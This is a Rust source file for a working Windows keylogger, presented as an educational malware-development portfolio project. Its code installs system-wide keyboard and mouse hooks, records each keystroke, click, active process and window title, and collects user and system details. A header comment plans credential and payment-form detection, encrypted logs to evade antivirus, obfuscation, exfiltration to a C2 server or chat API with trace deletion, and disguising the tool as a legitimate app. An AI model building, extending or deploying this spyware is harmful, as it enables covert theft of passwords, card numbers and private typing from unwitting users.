use std::ptr;
use std::mem;
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;
use winapi::shared::windef::{HHOOK, POINT};
use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM, DWORD, HKEY};
use winapi::um::sysinfoapi::{GetSystemInfo, GetVersionExW, SYSTEM_INFO};
use winapi::um::winuser::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN, GetCursorPos};
use winapi::um::winnt::{OSVERSIONINFOW, OSVERSIONINFOEXW, VER_NT_WORKSTATION, TOKEN_QUERY, TokenElevation, TOKEN_ELEVATION, REG_SZ, KEY_READ};
use winapi::ctypes::c_void;
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::handleapi::CloseHandle;
use winapi::um::winbase::GetUserNameW;
use winapi::um::winreg::{RegOpenKeyExW, RegQueryValueExW, RegCloseKey, HKEY_LOCAL_MACHINE};
use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::psapi::GetModuleBaseNameW;
use winapi::um::winnt::PROCESS_QUERY_INFORMATION;

use winapi::um::winuser::{
    CallNextHookEx, GetMessageW, SetWindowsHookExW, UnhookWindowsHookEx,
    HC_ACTION, KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN,
    WH_MOUSE_LL, MSLLHOOKSTRUCT, WM_LBUTTONDOWN, WM_RBUTTONDOWN, WM_MBUTTONDOWN,
    GetForegroundWindow, GetWindowTextW, GetWindowThreadProcessId,

};

/*
This is a keylogger for educational purposes only.
The main goal is proving some maldev portfolio + rust skills.
// Educational Purpose:
// This project is a keylogger for Windows developed in Rust for purely
// educational and research purposes in the field of 'malware development'. The goal is
// to understand the techniques used by this type of software to develop
// better defenses. The code will be part of a public portfolio on GitHub and will
// be used as material for a talk at the Ekoparty security conference.
// It must NOT be used for malicious purposes.
// -------------------------------------------------------------------

// # PHASE 1: Core Keylogger Requirements

// ## 1. Keystroke Hooking Module
//    - Objective: Silently capture all system-wide keystrokes.
//    - Implementation: Utilize a low-level keyboard hook via the WinAPI,
//      specifically with the `SetWindowsHookExA` and `GetMessage` functions.
//    - Log Format: Save the pressed key along with a timestamp. Handle
//      special keys like [SHIFT], [CTRL], [ENTER], [BACKSPACE], etc.

// ## 2. Context Awareness Module
//    - Objective: Understand where the user is typing to classify the information.
//    - 2.1. Active Application Identification:
//        - Implementation: Each time a key is captured, get the foreground window
//          (`GetForegroundWindow`) and its title (`GetWindowTextW`).
//        - Log: Record the process name (e.g., "chrome.exe") and the window title
//          (e.g., "Gmail - Inbox - Google Chrome").
//    - 2.2. Credential Form Detection:
//        - Heuristics: Analyze the window title and/or UI elements (if possible)
//          for keywords like "login", "sign in", "password", "register".
//    - 2.3. PII and Financial Data Form Detection:
//        - Heuristics: Similar to the previous point, look for keywords like "credit card",
//          "CVV", "billing address", "SSN".

// ## 3. Secure & Stealthy Storage Module
//    - Objective: Save the logs to the local disk in a way that is not easily
//      detectable or readable by an antivirus or a user.
//    - 3.1. Process Persistence:
//        - The program must run continuously and silently in the background.
//          Initially, it will be a console application, but the plan is to make it windowless.
//    - 3.2. Log Encryption:
//        - Implementation: Before writing data to the log file, encrypt it in memory.
//          Use a symmetric encryption algorithm (e.g., AES-GCM or ChaCha20-Poly1305)
//          with a key embedded in the binary.
//        - File Format: The resulting file will be binary, not plaintext,
//          preventing simple AV signatures from detecting it. A simple `cat` or `type`
//          command on the file will not reveal its contents.
//    - 3.3. Modern Evasion (Considerations):
//        - String Obfuscation: Avoid having cleartext strings in the binary (like "keylogger",
//          "hook", etc.).
//        - Dynamic API Loading: Load WinAPI functions at runtime
//          (`LoadLibrary`, `GetProcAddress`) to hinder static analysis.

// # PHASE 2: Future Enhancements

// ## 4. Data Exfiltration Module
//    - Objective: Periodically send the encrypted logs to a remote destination.
//    - Implementation (Future):
//        - Create an internal scheduler that activates every X hours.
//        - Send the log file through a discreet channel (e.g., an HTTP POST request
//          to a C2 server, using DNS-over-HTTPS, or via Telegram/Discord API).
//        - After sending, delete the local log to leave no trace.

// ## 5. Masquerading Module
//    - Objective: Make the keylogger appear to be a legitimate application.
//    - Implementation (Future):
//        - Package the keylogger inside an application with a real and useful
//          functionality (e.g., a calculator, a small game, a system optimizer).
//        - The keylogger will run in a separate thread while the main application
//          functions normally.

// # Dependencies (Crates to consider)
// - `winapi`: For direct calls to the Windows API.
// - `chrono`: For timestamp management.
// - `aes-gcm` or `chacha20poly1305`: For log encryption.
// - `reqwest`: (Future) For data exfiltration over HTTP.

*/


mod log;
mod encryption;
mod classifier;
mod scheduler;




fn check_admin_privileges() -> bool {
    use std::process::Command;
    
    // Método simple: intentar ejecutar un comando que requiere admin
    match Command::new("net").arg("session").output() {
        Ok(output) => output.status.success(),
        Err(_) => false,
    }
}


// Función para conseguir información básica del sistema
fn get_basic_info() -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        // Obtener información del sistema
        let mut system_info: SYSTEM_INFO = mem::zeroed();
        GetSystemInfo(&mut system_info);
        
        // Obtener resolución de pantalla
        let screen_width = GetSystemMetrics(SM_CXSCREEN);
        let screen_height = GetSystemMetrics(SM_CYSCREEN);
        
        // Obtener información de la versión del OS
        let mut os_info: OSVERSIONINFOW = mem::zeroed();
        os_info.dwOSVersionInfoSize = mem::size_of::<OSVERSIONINFOW>() as u32;
        GetVersionExW(&mut os_info);
        
        // Obtener nombre de usuario
        let mut username_buffer = [0u16; 256];
        let mut username_size = username_buffer.len() as DWORD;
        let username = if GetUserNameW(username_buffer.as_mut_ptr(), &mut username_size) != 0 {
            let username_slice = &username_buffer[..username_size.saturating_sub(1) as usize];
            OsString::from_wide(username_slice).to_string_lossy().to_string()
        } else {
            "Unknown".to_string()
        };
        
        // Verificar si tiene privilegios de administrador (método simplificado)
        let is_admin = check_admin_privileges();
        
        println!("=== SYSTEM INFORMATION ===");
        println!("Current User: {}", username);
        println!("Admin Privileges: {}", if is_admin { "YES" } else { "NO" });
        println!("Screen Resolution: {}x{}", screen_width, screen_height);
        println!("OS Version: {}", get_windows_version());
        println!("Architecture: {}", get_system_architecture());
    }
    
    Ok(())
}
// Función para obtener coordenadas del mouse
fn get_mouse_coords() -> Result<(i32, i32), Box<dyn std::error::Error>> {
    
    unsafe {
        let mut point: POINT = mem::zeroed();
        if GetCursorPos(&mut point) != 0 {
            Ok((point.x, point.y))
        } else {
            Err("Failed to get cursor position".into())
        }
    }
}


fn main() {
    

    // Initialize logger
    println!("Starting keylogger...");
    println!("Press Ctrl+C to stop...");
    println!("Getting basic info");
    if let Err(e) = get_basic_info() {
        eprintln!("Error getting system info: {}", e);
    }



    // Agregar manejo de señales para cleanup limpio
    ctrlc::set_handler(move || {
        println!("\nReceived Ctrl+C, cleaning up...");
        unsafe {
            if !HOOK.is_null() {
                UnhookWindowsHookEx(HOOK);
                println!("Keyboard hook removed successfully");
            }
            if !MOUSE_HOOK.is_null() {
                UnhookWindowsHookEx(MOUSE_HOOK);
                println!("Mouse hook removed successfully");
            }
        }
        std::process::exit(0);
    }).expect("Error setting Ctrl+C handler");
    

    // Iniciar captura de teclas
    if let Err(e) = capture_input() {
        eprintln!("Error starting keylogger: {}", e);
        // Cleanup en caso de error
        unsafe {
            if !HOOK.is_null() {
                UnhookWindowsHookEx(HOOK);
            }
        }
        return;
    }


}




static mut HOOK: HHOOK = ptr::null_mut();
static mut MOUSE_HOOK: HHOOK = ptr::null_mut();


// Callback para teclas
unsafe extern "system" fn low_level_keyboard_proc(
    n_code: i32,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    if n_code == HC_ACTION as i32 {
        if w_param == WM_KEYDOWN as usize || w_param == WM_SYSKEYDOWN as usize {
            let kb_struct = unsafe { *(l_param as *const KBDLLHOOKSTRUCT) };
            let vk_code = kb_struct.vkCode;
            
            // Convertir virtual key code a caracter
            let key_char = match vk_code {
                0x08 => "[BACKSPACE]".to_string(),
                0x09 => "[TAB]".to_string(),
                0x0D => "[ENTER]".to_string(),
                0x10 => "[SHIFT]".to_string(),
                0x11 => "[CTRL]".to_string(),
                0x12 => "[ALT]".to_string(),
                0x1B => "[ESC]".to_string(),
                0x20 => " ".to_string(),
                0x30..=0x39 => char::from(vk_code as u8).to_string(), // 0-9
                0x41..=0x5A => char::from(vk_code as u8).to_string(), // A-Z
                0x70..=0x87 => format!("[F{}]", vk_code - 0x6F), // F1-F12 y más
                0x90 => "[NUM LOCK]".to_string(),
                0x91 => "[SCROLL LOCK]".to_string(),
                0x14 => "[CAPS LOCK]".to_string(),
                0x2D => "[INSERT]".to_string(),
                0x2E => "[DELETE]".to_string(),
                0x24 => "[HOME]".to_string(),
                0x23 => "[END]".to_string(),
                0x21 => "[PAGE UP]".to_string(),
                0x22 => "[PAGE DOWN]".to_string(),
                0x25 => "[LEFT ARROW]".to_string(),
                0x26 => "[UP ARROW]".to_string(),
                0x27 => "[RIGHT ARROW]".to_string(),
                0x28 => "[DOWN ARROW]".to_string(),
                0x5B => "[LEFT WIN]".to_string(),
                0x5C => "[RIGHT WIN]".to_string(),
                0x5D => "[MENU]".to_string(),
                // Teclado numérico
                0x60..=0x69 => format!("[NUM {}]", vk_code - 0x60), // NUM 0-9
                0x6A => "[NUM *]".to_string(),
                0x6B => "[NUM +]".to_string(),
                0x6C => "[NUM ENTER]".to_string(),
                0x6D => "[NUM -]".to_string(),
                0x6E => "[NUM .]".to_string(),
                0x6F => "[NUM /]".to_string(),
                // Símbolos y puntuación
                0xBA => ";".to_string(),    // ;:
                0xBB => "=".to_string(),    // =+
                0xBC => ",".to_string(),    // ,<
                0xBD => "-".to_string(),    // -_
                0xBE => ".".to_string(),    // .>
                0xBF => "/".to_string(),    // /?
                0xC0 => "`".to_string(),    // `~
                0xDB => "[".to_string(),    // [{
                0xDC => "\\".to_string(),   // \|
                0xDD => "]".to_string(),    // ]}
                0xDE => "'".to_string(),    // '"
                // Teclas de modificadores adicionales
                0xA0 => "[LEFT SHIFT]".to_string(),
                0xA1 => "[RIGHT SHIFT]".to_string(),
                0xA2 => "[LEFT CTRL]".to_string(),
                0xA3 => "[RIGHT CTRL]".to_string(),
                0xA4 => "[LEFT ALT]".to_string(),
                0xA5 => "[RIGHT ALT]".to_string(),
                _ => format!("[{}]", vk_code),
            };
            
            // Print con fines de debugging
            println!("Key pressed: {}", key_char);
            // TODO: Aquí llamar a función de logging/encryption
        }
    }
    
    unsafe { CallNextHookEx(HOOK, n_code, w_param, l_param) }
}

// Callback para clicks del mouse
unsafe extern "system" fn low_level_mouse_proc(
    n_code: i32,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    if n_code == HC_ACTION as i32 {
        let mouse_struct = *(l_param as *const MSLLHOOKSTRUCT);
        let click_type = match w_param {
            x if x == WM_LBUTTONDOWN as usize => "LEFT CLICK",
            x if x == WM_RBUTTONDOWN as usize => "RIGHT CLICK", 
            x if x == WM_MBUTTONDOWN as usize => "MIDDLE CLICK",
            _ => return unsafe { CallNextHookEx(MOUSE_HOOK, n_code, w_param, l_param) },
        };
        
        println!("{} at: ({}, {})", click_type, mouse_struct.pt.x, mouse_struct.pt.y);
        
        // Obtener coordenadas del mouse
        match get_mouse_coords() {
            Ok((x, y)) => println!("Mouse coordinates: ({}, {})", x, y),
            Err(e) => eprintln!("Error getting mouse coords: {}", e),
        }
        
        // Obtener información del proceso activo en cada click
        match check_active_process() {
            Ok((process_name, window_title)) => {
                println!("Active Process: {} | Window: '{}'", process_name, window_title);
                },
            Err(e) => eprintln!("Error getting active process: {}", e),
        }
        
        println!("---"); // Separador para claridad
    }
    
    unsafe { CallNextHookEx(MOUSE_HOOK, n_code, w_param, l_param) }
}


// Renombrar y actualizar la función para capturar tanto teclado como mouse
fn capture_input() -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        // Instalar hook de teclado
        HOOK = SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(low_level_keyboard_proc),
            ptr::null_mut(),
            0,
        );
        
        if HOOK.is_null() {
            return Err("Failed to install keyboard hook".into());
        }
        
        // Instalar hook de mouse
        MOUSE_HOOK = SetWindowsHookExW(
            WH_MOUSE_LL,
            Some(low_level_mouse_proc),
            ptr::null_mut(),
            0,
        );
        
        if MOUSE_HOOK.is_null() {
            UnhookWindowsHookEx(HOOK); // Cleanup del keyboard hook
            return Err("Failed to install mouse hook".into());
        }
        
        println!("Keyboard and mouse hooks installed successfully");
        println!("Click anywhere or type to see input capture...");
        
        // Loop de mensajes para mantener ambos hooks activos
        let mut msg: MSG = std::mem::zeroed();
        while GetMessageW(&mut msg, ptr::null_mut(), 0, 0) > 0 {
            // Los hooks procesan automáticamente los eventos
        }
        
        // Cleanup
        UnhookWindowsHookEx(HOOK);
        UnhookWindowsHookEx(MOUSE_HOOK);
    }
    
    Ok(())
}


fn get_windows_version() -> String {
    // Método 1: Intentar leer desde el registro (más confiable)
    if let Some(version) = get_version_from_registry() {
        return version;
    }
    
    // Método 2: Usar GetVersionEx como fallback
    get_version_from_api()
}

fn get_version_from_registry() -> Option<String> {
    unsafe {
        let mut hkey: HKEY = std::ptr::null_mut();
        let key_path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect::<Vec<u16>>();
        
        // Abrir la clave del registro
        if RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            key_path.as_ptr(),
            0,
            KEY_READ,
            &mut hkey,
        ) != 0 {
            return None;
        }
        
        // Leer ProductName
        let product_name = read_registry_string(hkey, "ProductName")?;
        
        // Leer CurrentBuildNumber
        let build_number = read_registry_string(hkey, "CurrentBuildNumber")?;
        
        // Leer DisplayVersion (Windows 10/11) o ReleaseId como fallback
        let display_version = read_registry_string(hkey, "DisplayVersion")
            .or_else(|| read_registry_string(hkey, "ReleaseId"));
        
        RegCloseKey(hkey);
        
        // Construir la cadena de versión
        let mut version = product_name;
        if let Some(display_ver) = display_version {
            version.push_str(&format!(" (Version {})", display_ver));
        }
        version.push_str(&format!(" Build {}", build_number));
        
        Some(version)
    }
}

fn read_registry_string(hkey: HKEY, value_name: &str) -> Option<String> {
    unsafe {
        let value_name_wide: Vec<u16> = value_name
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        
        let mut data_type: DWORD = 0;
        let mut data_size: DWORD = 0;
        
        // Primero obtener el tamaño
        if RegQueryValueExW(
            hkey,
            value_name_wide.as_ptr(),
            std::ptr::null_mut(),
            &mut data_type,
            std::ptr::null_mut(),
            &mut data_size,
        ) != 0 || data_type != REG_SZ {
            return None;
        }
        
        // Leer el valor
        let mut buffer: Vec<u16> = vec![0; (data_size / 2) as usize];
        if RegQueryValueExW(
            hkey,
            value_name_wide.as_ptr(),
            std::ptr::null_mut(),
            &mut data_type,
            buffer.as_mut_ptr() as *mut u8,
            &mut data_size,
        ) != 0 {
            return None;
        }
        
        // Convertir a String
        let os_string = OsString::from_wide(&buffer[..buffer.len().saturating_sub(1)]);
        os_string.into_string().ok()
    }
}

fn get_version_from_api() -> String {
    unsafe {
        let mut os_info: OSVERSIONINFOEXW = std::mem::zeroed();
        os_info.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOEXW>() as u32;
        
        if GetVersionExW(&mut os_info as *mut _ as *mut _) == 0 {
            return "Unknown Windows Version".to_string();
        }
        
        let windows_version = match (os_info.dwMajorVersion, os_info.dwMinorVersion) {
            (10, 0) => {
                // Para Windows 10/11, necesitamos el build number
                if os_info.dwBuildNumber >= 22000 {
                    "Windows 11"
                } else {
                    "Windows 10"
                }
            },
            (6, 3) => "Windows 8.1",
            (6, 2) => "Windows 8",
            (6, 1) => "Windows 7",
            (6, 0) => "Windows Vista",
            (5, 2) => {
                // Distinguir entre XP 64-bit y Server 2003
                if os_info.wProductType == VER_NT_WORKSTATION {
                    "Windows XP 64-bit"
                } else {
                    "Windows Server 2003"
                }
            },
            (5, 1) => "Windows XP",
            (5, 0) => "Windows 2000",
            _ => "Unknown Windows Version",
        };
        
        format!("{} (Build {})", windows_version, os_info.dwBuildNumber)
    }
}

// Función adicional para obtener información de arquitectura
fn get_system_architecture() -> String {
    unsafe {
        let mut sys_info: SYSTEM_INFO = std::mem::zeroed();
        GetSystemInfo(&mut sys_info);
        
        match sys_info.u.s().wProcessorArchitecture {
            9 => "x64".to_string(),      // PROCESSOR_ARCHITECTURE_AMD64
            5 => "ARM".to_string(),      // PROCESSOR_ARCHITECTURE_ARM
            12 => "ARM64".to_string(),   // PROCESSOR_ARCHITECTURE_ARM64
            0 => "x86".to_string(),      // PROCESSOR_ARCHITECTURE_INTEL
            _ => "Unknown".to_string(),
        }
    }
}



// Función para obtener el nombre del proceso activo

fn check_active_process() -> Result<(String, String), Box<dyn std::error::Error>> {
    unsafe {
        // Obtener la ventana activa
        let hwnd = GetForegroundWindow();
        if hwnd.is_null() {
            return Err("No active window found".into());
        }
        
        // Obtener el título de la ventana
        let mut window_title = [0u16; 512];
        let title_len = GetWindowTextW(hwnd, window_title.as_mut_ptr(), window_title.len() as i32);
        let window_title_str = if title_len > 0 {
            let title_slice = &window_title[..title_len as usize];
            OsString::from_wide(title_slice).to_string_lossy().to_string()
        } else {
            "No Title".to_string()
        };
        
        // Obtener el ID del proceso
        let mut process_id: DWORD = 0;
        GetWindowThreadProcessId(hwnd, &mut process_id);
        
        if process_id == 0 {
            return Err("Could not get process ID".into());
        }
        
        // Abrir el proceso para obtener información
        let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, process_id);
        if process_handle.is_null() {
            return Ok(("Unknown Process".to_string(), window_title_str));
        }
        
        // Obtener el nombre del proceso
        let mut process_name = [0u16; 256];
        let name_len = GetModuleBaseNameW(
            process_handle,
            std::ptr::null_mut(),
            process_name.as_mut_ptr(),
            process_name.len() as DWORD,
        );
        
        CloseHandle(process_handle);
        
        let process_name_str = if name_len > 0 {
            let name_slice = &process_name[..name_len as usize];
            OsString::from_wide(name_slice).to_string_lossy().to_string()
        } else {
            "Unknown".to_string()
        };
        
        Ok((process_name_str, window_title_str))
    }
}
